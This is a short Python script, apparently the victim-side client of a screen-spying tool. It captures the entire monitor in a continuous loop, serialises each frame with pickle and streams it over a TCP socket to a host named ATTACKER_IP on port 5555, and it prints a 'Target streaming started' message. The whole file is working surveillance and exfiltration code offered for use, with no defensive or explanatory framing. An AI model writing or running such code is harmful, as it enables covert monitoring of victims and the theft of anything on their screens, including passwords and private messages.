import socket
import cv2
import pickle
import struct
import numpy as np
from mss import mss

ATTACKER_IP = "I WON'T SHOW YOU MY IP" # Enter your real IP.
PORT = 5555

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((ATTACKER_IP, PORT))


sct = mss()


monitor = sct.monitors[0] 

print("[+] Target streaming started successfully...")

try:
    while True:
       
        sct_img = sct.grab(monitor)
        img = np.array(sct_img)
        
        
        img = cv2.resize(img, (1280, 720))
        
        
        frame = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
        
        
        serialized_frame = pickle.dumps(frame)
        message = struct.pack("Q", len(serialized_frame)) + serialized_frame
        
        
        client.sendall(message)
        
except Exception as e:
    print(f"[-] Stream disconnected: {e}")
finally:
    client.close()
